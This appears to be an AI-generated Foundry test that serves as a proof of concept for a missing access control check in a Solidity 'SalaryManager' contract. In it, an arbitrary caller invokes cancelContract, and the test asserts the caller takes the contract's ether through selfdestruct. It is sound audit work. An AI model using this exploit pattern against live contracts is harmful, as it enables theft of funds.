// Generation Time: 8,31s
// Input Tokens: 2621
// Output Tokens: 542
// Reasoning Tokens: 0


// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SalaryManager} from "../src/SalaryManager.sol";

contract TestAccessControlSalaryManager is Test {
    SalaryManager private _salaryManager;
    address private _owner;

    function setUp() public {
        _owner = address(this);
        _salaryManager = new SalaryManager();
        
        // Fund the contract to satisfy the require condition in cancelContract
        vm.deal(address(_salaryManager), 10 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // Constrain the caller to exclude privileged addresses
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the owner (the only privileged role in this contract)
        vm.assume(caller != _owner);

        // Fund the caller to receive the selfdestruct funds
        vm.deal(caller, 1 ether);

        // Record the contract balance before the attack
        uint256 contractBalanceBefore = address(_salaryManager).balance;
        uint256 callerBalanceBefore = caller.balance;

        // Simulate the transaction from an unauthorized caller
        vm.prank(caller);
        
        // Attempt to call the unprotected cancelContract function
        // If vulnerable: call succeeds, contract is destroyed, funds sent to caller
        // If secure: call reverts with access control error
        _salaryManager.cancelContract();

        // Assert that the unauthorized caller received the contract's funds
        // This proves the access control vulnerability was exploited
        assertEq(caller.balance, callerBalanceBefore + contractBalanceBefore);
        
        // Assert that the contract code is now empty (selfdestruct succeeded)
        assertEq(address(_salaryManager).code.length, 0);
    }
}
